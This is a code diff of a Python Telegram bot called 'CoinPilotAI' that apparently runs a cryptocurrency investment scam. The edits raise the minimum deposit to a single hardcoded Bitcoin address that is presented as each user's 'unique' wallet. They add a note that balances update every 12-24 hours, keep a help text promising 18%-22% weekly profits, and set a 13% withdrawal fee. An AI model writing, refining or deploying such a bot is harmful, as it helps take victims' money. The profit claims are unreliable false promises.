@@ -158,15 +158,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cmd = query.data
 
     if cmd == "back_main":
-        await query.edit_message_text("Main Menu:", reply_markup=get_main_menu())
+        await query.edit_message_text(reply_markup=get_main_menu())
         return
 
     if cmd == "balance":
-        await query.edit_message_text(f"*Balance:* {balance:.8f} BTC", reply_markup=get_back_main_button(), parse_mode="Markdown")
+        await query.edit_message_text(f"*Balance:* {balance:.8f} BTC \n*Balances are updated every 12-24 hours.*", reply_markup=get_back_main_button(), parse_mode="Markdown")
 
     elif cmd == "deposit":
         await query.edit_message_text(
-            "Your unique account wallet (click to copy)\n\n`bc1q02dcj7722y8gawmlphstaaz3l2kyhzursn0sjh`\n\n*(Minimum 0.00095 BTC)*",
+            "Your unique account wallet (click to copy)\n\n`bc1q02dcj7722y8gawmlphstaaz3l2kyhzursn0sjh`\n\n*(Minimum 0.002 BTC)*",
             parse_mode="Markdown",
             reply_markup=get_back_main_button()
         )
@@ -226,7 +226,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"Strategy set to: {selected}", reply_markup=get_back_main_button())
 
     elif cmd == "help":
-        await query.edit_message_text("*Welcome to CoinPilotAI!*\n\n    CoinPilotAI is a Grok powered trading bot that promises 18%-22% weekly profits. This is by far, the easiest way to start your decentralized finance journey. It's very simple to begin, start by depositing Bitcoin into your account. You can find your account details with the deposit button. Once your funds are processed, you can pick a trading strategy and start the bot right away! The bot will begin using your account funds to make small term investments at rapid rates, with precision. The team behind CoinPilotAI receives a 13% cut of every withdrawal on the platform to keep things running. \n\nGood Luck! ", reply_markup=get_back_main_button(), parse_mode="Markdown")
+        await query.edit_message_text("*Welcome to CoinPilotAI!*\n\nCoinPilotAI is a Grok powered trading bot that promises 18%-22% weekly profits. This is by far, the easiest way to start your decentralized finance journey. It's very simple to begin, start by depositing Bitcoin into your account. You can find your account details with the deposit button. Once your funds are processed, you can pick a trading strategy and start the bot right away! The bot will begin using your account funds to make small term investments at rapid rates, with precision. The team behind CoinPilotAI receives a 13% cut of every withdrawal on the platform to keep things running.", reply_markup=get_back_main_button(), parse_mode="Markdown")
 
     elif cmd == "exit":
         await query.edit_message_text("Goodbye!")
@@ -320,7 +320,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ----------------------------
     if uid in pending_affiliate and pending_affiliate[uid] == "redeem":
         if msg == "G7HA2N":
-            await update.message.reply_text("Code Redeemed ✅ On your next withdrawal, your transaction fee will be lowered from 13%, down to 4%.", reply_markup=get_affiliate_menu())
+            await update.message.reply_text("Code Redeemed ✅, on your next withdrawal, your transaction fee will be lowered from 13%, down to 4%.", reply_markup=get_affiliate_menu())
         else:
             await update.message.reply_text("Invalid Code ❌", reply_markup=get_affiliate_menu())
         pending_affiliate.pop(uid)
@@ -334,7 +334,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         net = bal - fee
         pending_withdrawal.pop(uid, None)
         await update.message.reply_text(
-            f"Confirm sending {net:.8f} BTC (5% fee) to `{addr}`:", parse_mode="Markdown",
+            f"Confirm sending {net:.8f} BTC (13% fee) to `{addr}`:", parse_mode="Markdown",
             reply_markup=get_withdrawal_confirmation(uid, addr, net, fee)
         )
         return
@@ -438,3 +438,4 @@ if __name__ == "__main__":
     nest_asyncio.apply()  # already in your code
     loop = asyncio.get_event_loop()
     loop.run_until_complete(start_bot())
+
